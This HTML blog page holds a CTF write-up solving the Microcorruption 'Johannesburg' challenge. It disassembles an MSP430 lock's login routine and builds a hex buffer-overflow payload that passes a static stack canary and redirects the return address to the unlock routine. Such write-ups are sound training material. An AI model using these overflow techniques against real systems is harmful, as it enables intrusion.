@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  
+  <script type="application/ld+json">
+{
+    "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https://leonjza.github.io"
+    },
+    "articleSection" : "post",
+    "name" : "microcorruption - johannesburg",
+    "headline" : "microcorruption - johannesburg",
+    "description" : "<figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/microcorruption.png" />
+    
+    
+</figure>
+
+
+<p>This post is part of the series of solving <a href="https://microcorruption.com">microcorruption.com</a> ctf challenges which continues from the <a href="https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/">previous challenge</a> called <em>Montevideo</em>. This challenge is titled <em>Johannesburg</em>.</p>
+
+<p>The challenge has the following description when you start:</p>
+
+<blockquote>
+<p>This is Software Revision 04. We have improved the security of the lock by ensuring passwords that are too long will be rejected.</p>
+</blockquote>
+
+<p>Alright. This might mean that we are done with the overflow challenges? Lets dive in!
+</p>",
+    "inLanguage" : "en-US",
+    "author" : "Leon Jacobs",
+    "creator" : "Leon Jacobs",
+    "publisher": "Leon Jacobs",
+    "accountablePerson" : "Leon Jacobs",
+    "copyrightHolder" : "Leon Jacobs",
+    "copyrightYear" : "2018",
+    "datePublished": "2018-03-09 14:31:25 &#43;0200 SAST",
+    "dateModified" : "2018-03-09 14:31:25 &#43;0200 SAST",
+    "url" : "https://leonjza.github.io/blog/2018/03/09/microcorruption---johannesburg/",
+    "wordCount" : "541",
+    "keywords" : [ "ctf","exploit","assembly","microcorruption","johannesburg","Blog" ]
+}
+</script>
+
+
+  <title>microcorruption - johannesburg &middot; </title>
+
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/poole.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/poole-overrides.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-overrides.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-x.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
+  <link href="https://leonjza.github.io/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-44457032-2', 'auto');
+    ga('send', 'pageview');
+  </script>
+  
+</head>
+<body class="theme-base-0d">
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+      <h1></h1>
+      <p class="lead">#!/slash/note<br />
+<em>A checkbox unchecker&rsquo;s notepad</em></p>
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/">Blog</a></li>
+      
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/post">Posts</a></li>
+      
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/about/">About Me</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      
+      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
+      
+      
+      </li>
+    </ul>
+
+    
+
+    <p>Copyright &copy; 2018 <a href="https://leonjza.github.io/license/">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1 class="post-title">microcorruption - johannesburg</h1>
+    <span class="post-date">Mar 9, 2018 &middot; 3 minute read &middot; <a href="https://leonjza.github.io/blog/2018/03/09/microcorruption---johannesburg/#disqus_thread">Comments</a>
+    
+    <br/>
+    <a class="label" href="https://leonjza.github.io/categories/ctf">ctf</a><a class="label" href="https://leonjza.github.io/categories/exploit">exploit</a><a class="label" href="https://leonjza.github.io/categories/assembly">assembly</a><a class="label" href="https://leonjza.github.io/categories/microcorruption">microcorruption</a><a class="label" href="https://leonjza.github.io/categories/johannesburg">johannesburg</a>
+    </span>
+    <figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/microcorruption.png" />
+    
+    
+</figure>
+
+
+<p>This post is part of the series of solving <a href="https://microcorruption.com">microcorruption.com</a> ctf challenges which continues from the <a href="https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/">previous challenge</a> called <em>Montevideo</em>. This challenge is titled <em>Johannesburg</em>.</p>
+
+<p>The challenge has the following description when you start:</p>
+
+<blockquote>
+<p>This is Software Revision 04. We have improved the security of the lock by ensuring passwords that are too long will be rejected.</p>
+</blockquote>
+
+<p>Alright. This might mean that we are done with the overflow challenges? Lets dive in!
+</p>
+
+<h2 id="johannesburg">johannesburg</h2>
+
+<p>Just like we have seen in a number of previous challenges now, Johannesburg follows a similar structure with the <code>main</code> routine simply calling <code>login</code>. Within the <code>login</code> routine a number of steps are taken.</p>
+
+<pre><code class="language-asm">452c &lt;login&gt;
+
+[.. get the password with getsn ..]
+
+4552:  3e40 0024      mov   #0x2400, r14
+4556:  0f41           mov   sp, r15
+
+; maybe copying the password to a different location
+; in memory again.
+4558:  b012 2446      call  #0x4624 &lt;strcpy&gt;
+455c:  0f41           mov   sp, r15
+
+; check the password. routine issues syscall 0x7d which
+; will ask the HSM to validate.
+455e:  b012 5244      call  #0x4452 &lt;test_password_valid&gt;
+4562:  0f93           tst   r15
+4564:  0524           jz    #0x4570 &lt;login+0x44&gt;
+4566:  b012 4644      call  #0x4446 &lt;unlock_door&gt;
+
+[.. messages about the status of the unlock ..]
+
+; ooh, interesting random single byte compare? Seems like
+; this is specifically for a length check. lol.
+4578:  f190 6a00 1100 cmp.b #0x6a, 0x11(sp)
+457e:  0624           jeq   #0x458c &lt;login+0x60&gt;
+4580:  3f40 ff44      mov   #0x44ff &quot;Invalid Password Length: password too long.&quot;, r15
+4584:  b012 f845      call  #0x45f8 &lt;puts&gt;
+4588:  3040 3c44      br    #0x443c &lt;__stop_progExec__&gt;
+458c:  3150 1200      add   #0x12, sp
+4590:  3041           ret
+</code></pre>
+
+<p>Everything seems to be pretty much as expected, apart from the byte compare that happens at <code>0x4578</code>. The instruction at <code>0x4578</code> compares the byte that is at <code>sp + 0x11</code> with <code>0x6a</code>, just like a static stack canary.</p>
+
+<p>To inspect this a little closer, I set a breakpoint at the <code>cmp.b</code> instruction with <code>break 4578</code> and entered 20 <code>41</code>&rsquo;s as a hex encoded password.</p>
+
+
+<figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/johannesburg_stack_canary.png" />
+    
+    
+</figure>
+
+
+<p>Stepping through the program to pass the <code>jeq</code> instruction saw that the program would not take the jump and continue to print the message about the password being too long. Inspecting the memory with <code>read sp+11</code> also showed that the byte contained <code>41</code>, which will cause the <code>cmp.b</code> to set a non equal status register.</p>
+
+<p>To bypass this check, all we need to do is provide <code>0x6a</code> in the correct position so that the <code>cmp.b</code> will result in an equal status. Inspecting the memory (as well as the instruction <code>0x11(sp)</code>), we can see this is at offset 17. All we need to do is pad the password payload and provide <code>0x6a</code> as the 17th byte.</p>
+
+<pre><code class="language-python">python -c &quot;print('41' * 0x11 + '6A' + '42' * 10)&quot;
+41414141414141414141414141414141416A42424242424242424242
+</code></pre>
+
+
+<figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/johannesburg_stack_canary.png" />
+    
+    
+</figure>
+
+
+<p>Once the canary check has passed, the code flow jumps to <code>0x458c</code> which adds <code>0x12</code> to the stack pointer which also happens to be right after the canary value. Considering we have a nice helper routine to unlock the lock at <code>0x4446</code>, all we need to do is provide that (little endian formatted) address to jump to and profit.</p>
+
+<pre><code class="language-python">python -c &quot;print('41' * 0x11 + '6A' + '4644')&quot;
+41414141414141414141414141414141416A4644
+</code></pre>
+
+
+<figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/johannesburg_solve.png" />
+    
+    
+</figure>
+
+
+<h2 id="solution">solution</h2>
+
+<p>Enter <code>41414141414141414141414141414141416A4644</code> as hex encoded input.</p>
+
+<h2 id="other-challenges">other challenges</h2>
+
+<p>For my other write ups in the microcorruption series, checkout <a href="https://leonjza.github.io/categories/microcorruption/">this</a> link.</p>
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "slashnote";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "slashnote";
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<script src="https://leonjza.github.io/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
+
